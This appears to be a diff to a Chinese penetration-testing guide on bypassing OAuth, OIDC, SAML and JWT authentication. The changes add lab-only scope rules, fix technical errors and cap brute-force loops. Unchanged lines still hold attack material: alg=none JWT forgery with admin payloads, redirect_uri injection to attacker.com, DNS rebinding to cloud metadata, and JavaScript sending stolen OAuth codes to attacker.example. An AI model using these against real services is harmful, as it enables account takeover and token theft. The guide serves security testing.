@@ -2,10 +2,20 @@
 
 > 视角：黑盒，目标是绕过认证 / 伪造 token / 接管账号
 
+## 复现边界与协议条件
+
+只使用研究员控制的测试账户、合成令牌和隔离 IdP/SP；真实令牌不上传 jwt.io 等第三方。拒绝/限流时停止，不以更多代理、账户或 client_id 扩大预算。HTTP 200、302、dashboard/success 子串和前端状态修改都不是认证成功证明。
+
+- state 缺失不自动证明 CSRF：需核对与会话绑定的 PKCE、OIDC nonce 等等效防护；授权请求出现 code_challenge 也不证明兑换端强制验证。
+- JWT 是无填充 base64url；普通 base64 命令仅对部分样本偶然可用。公开 RSA/JWKS 不是“密钥泄露”，TLS 证书公钥不保证是 JWT 签名密钥；现代 PyJWT 拒绝把 PEM 非对称公钥作为 HMAC 密钥，因此下方历史 Python 草图不保证可运行。
+- SAML Assertion 单独签名可为合法配置；关键是验证受信签名并仅消费被签名且条件匹配的断言。修改字段或自签证书不能通过正确校验。HTTP-Redirect 使用 raw DEFLATE，不能把 zlib.compress 的封装输出当作通用绑定。
+- PHP strcmp(array, string) 返回 NULL 属于旧版行为；PHP 8 会抛 TypeError。Cookie 配额、SameSite 导航条件和 Shiro 密钥/加密模式需核对具体版本；静态历史值不代表当前默认配置。
+- 许多 URL 样本实际仍指向 target.com，# 后片段不发送服务器；路径中的 @ 也不自动改变主机。必须分别记录服务端解析、浏览器最终地址和测试回调的实际收到内容，不能把样本列表当通用绕过。
+
 ## 1. 一句话说清
 
-OAuth/OIDC/SAML 是把"认证"外包给第三方 IdP；JWT 是常用的 token 格式。
-SRC 价值：能伪造任意用户身份 = P0；能让回调把 code 发到攻击者域 = P0。
+OAuth 是授权框架；OIDC 在 OAuth 上增加身份层，SAML 可传递认证/授权断言。JWT 是令牌格式，不自动等同访问令牌或加密。
+严重度须结合实际身份/权限影响评估；授权码泄露不自动等于可兑换或完整账号接管。
 
 ---
 
@@ -63,7 +73,7 @@ SRC 价值：能伪造任意用户身份 = P0；能让回调把 code 发到攻�
 ?redirect_uri=https://target.com%0d%0aLocation:%20https://attacker.com
 ```
 
-成功的话 → 把 `code` 发到攻击者的 callback → 用 code 换 token。
+若授权码确实到达测试回调，仍需核对 PKCE、客户端认证、code/client/redirect_uri 绑定和一次性限制，不能假定可兑换。
 
 ### 3.2 state / nonce 缺失
 
@@ -93,8 +103,8 @@ SRC 价值：能伪造任意用户身份 = P0；能让回调把 code 发到攻�
 ```bash
 # 1. alg=none
 {"alg":"none","typ":"JWT"}.{...payload...}.   ← 空签名
-echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
-echo -n '{"sub":"admin"}' | base64 -w0
+echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '=\n'
+echo -n '{"sub":"admin"}' | base64 | tr '/+' '_-' | tr -d '=\n'
 拼成 token：<header>.<payload>.
 
 # 2. HS/RS 混淆
@@ -205,7 +215,7 @@ SAML XSW → 把 Subject 改成 admin → 直接进管理后台
 通用指纹：
 - 授权请求里 `redirect_uri` 接受 `https://target.com@evil.com` 不报错 → 漏洞
 - JWT header 含 `"alg":"RS256"`，改成 `"alg":"none"` 应用仍接受 → P0
-- JWKS 端点返回 `kid` 列表，应用允许任意 `kid` 选 → 伪造
+- 公开 JWKS/kid 是正常功能；只有攻击者能控制受信密钥或验证逻辑缺陷才可能伪造
 - SAML Response 的 `Recipient` 不被校验 → 重放
 
 ---
@@ -239,7 +249,7 @@ grant_type=authorization_code&code=AUTHCODE&redirect_uri=...&client_id=xxx&clien
 eyJhbGciOiJSUzI1NiIs...
 
 伪造（alg=none，sub=admin）：
-echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0     → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '=\n'     → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
 echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 → eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0
 拼接：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
 
@@ -387,13 +397,7 @@ user=admin&pass[]=1
 
 # 2. 松散比较绕过:
 POST /login HTTP/1.1
-Content-Type: application/json,
-
-        syntaxBreakdown: [
-          { part: ''', explanation: { zh: '闭合引号', en: 'Close quote' }, type: 'char' },
-          { part: 'OR', explanation: { zh: '逻辑或', en: 'Logical OR' }, type: 'keyword' },
-          { part: '--', explanation: { zh: 'SQL注释', en: 'SQL comment' }, type: 'operator' }
-        ]
+Content-Type: application/json
 {"user":"admin","pass":true}
 # true == "any_string" 在PHP松散比较中为true
 
@@ -667,7 +671,7 @@ _通过预设sessionId使受害者登录后攻击者可以复用该会话_
 ```
 # 1. 攻击者获取一个有效的sessionId
 curl -c cookies.txt "http://target.com/"
-cat cookies.txt | grep -i "session|jsession|phpsess"
+cat cookies.txt | grep -iE "session|jsession|phpsess"
 
 # 2. 构造包含固定sessionId的链接诱使受害者登录
 # http://target.com/login;jsessionid=ATTACKER_SESSION_ID
@@ -802,7 +806,7 @@ email=victim@target.com&code=§0000§
 
 # 3. 六位验证码爆破(需更多时间):
 import requests
-for code in range(0, 999999):
+for code in range(2):  # 仅两个批准的合成测试候选
     r = requests.post('http://target.com/reset-password',
         data={'email':'victim@target.com','code':f'{code:06d}'})
     if 'success' in r.text or r.status_code == 302:
@@ -908,10 +912,10 @@ def try_token(token, proxy=None):
     r = requests.post("http://target.com/reset-password",
         data={"token": token, "new_password": "Test123!"},
         headers=headers, timeout=10)
-    return r.status_code != 400
+    return False  # HTTP 状态不能确认 Token 有效；核对测试账户实际状态
 
 # 如果Token是6位数字:
-for i in range(0, 1000000):
+for i in range(2):  # 不枚举真实重置 Token 空间
     token = f"{i:06d}"
     if try_token(token):
         print(f"[+] Valid token: {token}")
@@ -985,7 +989,7 @@ _OAuth Token窃取、Scope越权、跨应用Token复用测试_
 # implicit flow中Token在URL fragment中:
 # http://attacker.com/callback#access_token=xxx
 # 使用Referer泄露:
-# 如果callback页面有外链，Token会通过Referer泄露
+# URL fragment 不会随 HTTP Referer 自动发送；页面脚本/应用复制等其他路径需单独验证。
 
 # 2. Scope越权 - 请求更高权限:
 curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"
@@ -1280,7 +1284,7 @@ POST /verify-backup-code
 
 # 竞态条件(Race Condition):
 # 同时发送多个验证请求:
-for i in $(seq 000000 000100); do
+for i in 000000 000001; do  # 限隔离实验的一对请求
   curl -s -X POST "http://target.com/verify-2fa"     -b "session=SID" -d "otp=$i" &
 done
 wait
@@ -1823,7 +1827,7 @@ curl -s -H "Authorization: Bearer {FORGED_JWT}" \
   "https://{TARGET}/api/admin/dashboard"
 
 # 检查是否获得管理员权限
-# 200 OK = 攻击成功
+# 200 OK 只是候选，须确认测试身份/受保护数据；普通页面、错误 JSON 或反射不构成证明
 # 401/403 = 服务端正确拒绝none算法
 ```
 
@@ -1976,7 +1980,7 @@ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
 # 掩码暴力破解(8位数字密钥)
-hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
+hashcat -m 16500 -a 3 jwt.txt '?d?d?d?d?d?d?d?d'
 ```
 
 **3. 3. jwt_tool字典爆破**
@@ -2088,7 +2092,9 @@ with open("jwks.json", "w") as f:
 _托管JWKS文件并用攻击者私钥签名JWT，jku指向攻击者服务器_
 ```
 # 在攻击者服务器托管jwks.json
-python3 -m http.server 8080
+# 仅从专用公钥目录提供 jwks.json；不得从含 attacker_private.pem 的目录启动文件服务器。
+# 默认绑定环回并通过实验网络配置显式允许的访问范围。
+python3 -m http.server 8080 --bind 127.0.0.1 --directory ./public-jwks
 # http://evil.com:8080/jwks.json
 
 import jwt
@@ -2343,7 +2349,7 @@ curl "http://target.com/api/fetch?url=http://attacker.com/redirect"
 # 使用rbndr.us等工具，DNS记录在attacker-IP和内部IP之间切换
 # 第一次解析: attacker.com → 1.2.3.4 (通过IP检查)
 # 第二次解析: attacker.com → 169.254.169.254 (实际请求)
-curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"
+# 原示例含非法 ] 主机字符，不是有效 URL；仅使用自控实验 DNS，不依赖公共重绑定服务。
 ```
 
 **4. 完整利用链: 重定向→SSRF→内网探测**
@@ -2449,7 +2455,7 @@ var capturedCode = urlParams.get('code');  // 也可换成 'access_token' / 'id_
 
 if (capturedCode) {
     var http = new XMLHttpRequest();
-    // GET 模式带在 query;实战推荐 fetch + no-cors 或 navigator.sendBeacon 以规避 CSP report-only
+    // GET 模式带在 query;实战推荐 fetch + no-cors 或 navigator.sendBeacon ；no-cors/beacon 不绕过强制 CSP，report-only 本来仅报告不阻止
     http.open("GET", "https://attacker.example/log_code.php?code=" + encodeURIComponent(capturedCode), true);
     http.send();
 }
